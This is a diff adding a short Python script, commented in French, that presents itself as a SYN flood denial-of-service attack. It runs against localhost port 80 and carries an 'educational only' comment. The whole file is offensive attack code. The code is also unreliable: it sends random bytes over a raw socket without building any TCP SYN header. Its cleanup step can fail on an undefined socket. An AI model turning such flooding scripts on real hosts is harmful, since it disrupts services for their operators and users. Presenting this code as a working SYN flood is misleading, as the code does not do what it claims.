@@ -1,0 +1,25 @@
+import socket
+import random
+
+def syn_flood(target_ip, target_port, duration):
+    print(f"Lancement d'une attaque SYN flood sur {target_ip}:{target_port}...")
+    try:
+        while duration > 0:
+            # Créer un socket RAW pour construire manuellement les paquets TCP
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            # Construire un paquet SYN (simplifié)
+            packet = random._urandom(1024)  # Données aléatoires
+            sock.sendto(packet, (target_ip, target_port))
+            duration -= 1
+    except Exception as e:
+        print(f"Erreur lors de l'envoi des paquets SYN: {e}")
+    finally:
+        sock.close()
+
+# Paramètres de l'attaque simulée (à des fins éducatives uniquement)
+target_ip = "127.0.0.1"  # Adresse IP de la cible (localhost dans cet exemple)
+target_port = 80         # Port de la cible (HTTP)
+duration = 1000          # Nombre de paquets à envoyer
+
+# Lancer l'attaque simulée
+syn_flood(target_ip, target_port, duration)
